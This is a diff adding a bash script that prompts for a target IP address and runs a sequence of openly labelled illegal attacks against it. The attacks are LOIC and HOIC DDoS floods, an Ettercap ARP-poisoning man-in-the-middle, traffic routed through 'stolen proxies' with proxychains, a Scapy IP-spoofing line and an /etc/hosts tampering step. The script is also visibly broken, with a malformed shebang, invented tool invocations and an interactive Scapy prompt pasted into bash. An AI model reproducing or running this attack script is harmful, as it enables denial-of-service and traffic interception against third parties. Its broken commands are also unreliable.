@@ -1,0 +1,35 @@
+# !/bin/bash
+
+# Ask for the IP Address to target (illegal, malicious intent)
+read -p "Enter IP Address to target: " IP_ADDRESS
+
+# Display IP Address entered
+echo "You entered: $IP_ADDRESS"
+
+# DDoS attack using LOIC (Low Orbit Ion Cannon) – **Illegal**
+echo "[+] Initiating DDoS attack with LOIC"
+loic http://$IP_ADDRESS
+
+# DDoS attack using HOIC (High Orbit Ion Cannon) – **Illegal**
+echo "[+] Initiating DDoS attack with HOIC"
+hoic -url http://$IP_ADDRESS
+
+# MITM (Man-in-the-Middle) attack using Ettercap – **Illegal**
+echo "[+] Initiating MITM attack using Ettercap"
+sudo ettercap -T -q -i eth0 -M arp:remote /$IP_ADDRESS/ /192.168.1.1/  # Intercept traffic
+
+# Using Proxychains with stolen proxies to hide identity (illegal evasion) – **Illegal**
+echo "[+] Routing traffic through stolen proxies"
+proxychains curl http://$IP_ADDRESS
+
+# IP Spoofing with Scapy (illegal, malicious intent) – **Illegal**
+echo "[+] Spoofing IP address"
+sudo scapy
+>>> send(IP(src="$IP_ADDRESS", dst="192.168.1.1")/ICMP())  # Spoof source IP to impersonate traffic
+
+# Log the IP in a blacklist for malicious intent – **Illegal**
+echo "[+] Logging $IP_ADDRESS as malicious"
+echo "$IP_ADDRESS blackhat.attacker" | sudo tee -a /etc/hosts
+
+# Completed message (This is an illegal action, should not be performed)
+echo "[+] Malicious activities executed for IP: $IP_ADDRESS"
